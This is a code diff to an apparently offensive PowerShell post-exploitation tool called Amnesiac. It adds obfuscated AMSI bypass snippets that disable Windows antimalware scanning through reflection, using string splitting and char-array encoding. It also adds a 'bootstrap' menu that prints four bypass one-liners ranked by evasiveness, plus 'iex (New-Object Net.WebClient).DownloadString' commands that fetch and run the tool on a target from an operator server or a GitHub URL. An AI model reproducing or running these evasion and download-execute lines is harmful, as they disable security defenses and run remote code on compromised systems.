@@ -41,6 +41,16 @@ function Get-AmsiBypassSnippet {
             )
         }
 
+        'split' {
+            # Concat splits every sensitive literal — simpler than char arrays, breaks static sig matching
+            return "try{`$_t=[Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Auto'+'mation.'+'Ams'+'iUt'+'ils');`$_t.GetField('amsi'+'Con'+'text','NonPublic,Static').SetValue(`$null,[IntPtr]::Zero);`$_t.GetField('amsi'+'Init'+'Failed','NonPublic,Static').SetValue(`$null,`$true)}catch{}"
+        }
+
+        'session' {
+            # Null amsiSession — targets a different field than amsiInitFailed; char arrays for both type and field name
+            return "try{`$_t=[Ref].Assembly.GetType([string]::new([char[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)));`$_t.GetField([string]::new([char[]](97,109,115,105,83,101,115,115,105,111,110)),'NonPublic,Static').SetValue(`$null,`$null)}catch{}"
+        }
+
         { $_ -in 'pageguard','hwbp' } {
             # Full PAGE_GUARD+VEH or hardware-breakpoint technique requires AmnesiacLoader.Bypass (C#).
             # PS payload uses 'fail' fallback; full technique activates via 'load loader' in session.
@@ -945,6 +955,40 @@ function Amnesiac {
 			} else {
 				$global:PSKPhrase = $arg; $global:PSKBytes = Get-PskDerivedKey -Passphrase $arg; $global:Message = " [+] PSK configured"
 			}
+			continue
+		}
+
+		# ---- bootstrap: assumed breach AMSI bypass one-liners + load command ----
+		if ($choice -eq 'bootstrap') {
+			$_srv = if ($global:ServerURL) { $global:ServerURL -replace '/Tools/?$','' } else { 'http://<operator-IP>:8080' }
+			$_load  = "iex (New-Object Net.WebClient).DownloadString('$_srv/Amnesiac_ShellReady.ps1');Amnesiac"
+			$_b1 = Get-AmsiBypassSnippet -Technique 'fail'
+			$_b2 = Get-AmsiBypassSnippet -Technique 'session'
+			$_b3 = Get-AmsiBypassSnippet -Technique 'split'
+			$_b4 = Get-AmsiBypassSnippet -Technique 'direct'
+			Write-Host ""
+			Write-Host " [+] Assumed Breach Bootstrap — AMSI Bypass Options" -ForegroundColor Cyan
+			Write-Host " [*] Paste ONE bypass into the target PS process, then paste the load command." -ForegroundColor Yellow
+			Write-Host " [*] Try in order — [1] is most evasive, [4] is highest detection risk." -ForegroundColor Yellow
+			Write-Host ""
+			Write-Host " [1] Field-enum via char array (no field/type name literals anywhere):" -ForegroundColor Green
+			Write-Host "     $_b1" -ForegroundColor Gray
+			Write-Host ""
+			Write-Host " [2] amsiSession null (different field, char arrays for type + field):" -ForegroundColor Green
+			Write-Host "     $_b2" -ForegroundColor Gray
+			Write-Host ""
+			Write-Host " [3] String-split (concat breaks static sig — simpler but weaker):" -ForegroundColor Green
+			Write-Host "     $_b3" -ForegroundColor Gray
+			Write-Host ""
+			Write-Host " [4] Direct AmsiScanBuffer patch (no AMSI reflection, requires Add-Type):" -ForegroundColor Green
+			Write-Host "     $_b4" -ForegroundColor Gray
+			Write-Host ""
+			Write-Host " [*] Then load Amnesiac (operator HTTP server):" -ForegroundColor Cyan
+			Write-Host "     $_load" -ForegroundColor White
+			Write-Host ""
+			Write-Host " [*] GitHub fallback (no operator server available):" -ForegroundColor Cyan
+			Write-Host "     iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Amnesiac_ShellReady.ps1');Amnesiac" -ForegroundColor White
+			Write-Host ""
 			continue
 		}
 
